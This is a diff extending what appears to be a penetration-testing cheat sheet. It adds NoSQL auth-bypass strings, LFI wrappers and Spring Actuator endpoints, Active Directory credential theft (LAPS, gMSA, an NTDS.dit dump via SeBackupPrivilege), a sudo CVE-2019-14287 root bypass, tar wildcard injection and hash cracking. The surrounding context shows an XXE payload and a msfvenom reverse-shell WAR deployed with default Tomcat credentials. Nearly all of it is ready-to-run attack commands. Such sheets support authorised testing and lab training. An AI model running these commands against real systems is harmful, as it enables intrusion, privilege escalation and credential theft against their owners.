@@ -103,6 +103,11 @@ wpscan --url http://$IP -U <user> -P /usr/share/wordlists/rockyou.txt   # login 
 # <?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>
 #   PHP source: file:///... -> php://filter/convert.base64-encode/resource=index.php
 
+# NoSQL (Mongo) auth bypass / extract
+#   username[$ne]=x&password[$ne]=x        |  username[$regex]=^admin
+# Spring Boot Actuator (Java):  /actuator/env  /actuator/heapdump  /actuator/sessions
+# LFI->RCE wrappers: php://filter/convert.base64-encode/resource=  data://  phar://
+
 # Tomcat Manager -> WAR shell (defaults: tomcat:tomcat / tomcat:s3cret / admin:admin)
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f war -o rev.war
 curl -u tomcat:s3cret -T rev.war "http://$IP:8080/manager/text/deploy?path=/rev"
@@ -176,6 +181,13 @@ evil-winrm -i $IP -u <user> -H <ntlm-hash>       # pass-the-hash
 ```bash
 # GPP cpassword pulled from a share by hand (e.g. null-session Replication share)
 gpp-decrypt '<cpassword>'                      # AES key is public; recovers the plaintext
+nxc ldap $IP -u <user> -p <pass> --laps        # local-admin pw off the computer object
+nxc ldap $IP -u <user> -p <pass> --gmsa        # gMSA managed password (or gMSADumper.py)
+# SeBackupPrivilege on a DC -> NTDS.dit:
+#   diskshadow (expose C: as Z:) ; robocopy /b Z:\Windows\NTDS . ntds.dit ; reg save hklm\system system
+#   secretsdump.py -ntds ntds.dit -system system LOCAL
+runas /user:<dom>\administrator /savecred "cmd /c whoami"   # re-use a cmdkey-stored cred
+dir /R                                          # NTFS alternate data streams (Get-Content f -Stream x)
 ```
 
 
@@ -256,6 +268,9 @@ getcap -r / 2>/dev/null                       # capabilities
 crontab -l; cat /etc/crontab
 # check GTFOBins for anything you find in sudo -l or SUID
 ./pspy64 -pf -i 1000                          # watch cron/procs as root fires them (no root needed)
+sudo -u#-1 /bin/bash                           # CVE-2019-14287, when sudo -l shows (ALL, !root)
+# root runs a writable thing: cron/systemd-timer script | /etc/update-motd.d/* (fires on SSH login)
+# root 'tar ... *' in a writable dir -> touch -- '--checkpoint=1' '--checkpoint-action=exec=sh x.sh'
 # restricted shell (rbash)? escape:
 ssh <user>@$IP -t bash --noprofile --norc      # or from inside: vi -> :set shell=/bin/sh :shell
 
@@ -305,6 +320,7 @@ kubectl auth can-i --list            # create pods -> schedule a privileged host
 hashcat -m <mode> hash.txt /usr/share/wordlists/rockyou.txt
 john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
 # common modes: 0 md5, 1000 ntlm, 1800 sha512crypt, 13100 kerberoast TGS
+ciscot7.py -d -p <type7>                       # Cisco type 7 is reversible; type 5 = md5crypt (john)
 hashcat --example-hashes | grep -i <type>      # find the right mode
 ```
 
